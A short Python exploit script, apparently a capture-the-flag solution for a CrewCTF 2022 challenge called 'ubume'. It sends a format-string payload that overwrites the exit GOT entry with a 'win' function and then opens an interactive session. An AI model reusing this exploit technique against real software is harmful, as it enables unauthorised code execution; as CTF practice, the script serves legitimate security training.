#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./ubume')
host = args.HOST or 'ubume.crewctf-2022.crewc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
for i in range(200):
	io = start()
	payload = fmtstr_payload(6, {exe.got.exit : exe.sym.win}, write_size='short')
	re()
	sl(payload)
	io.interactive()
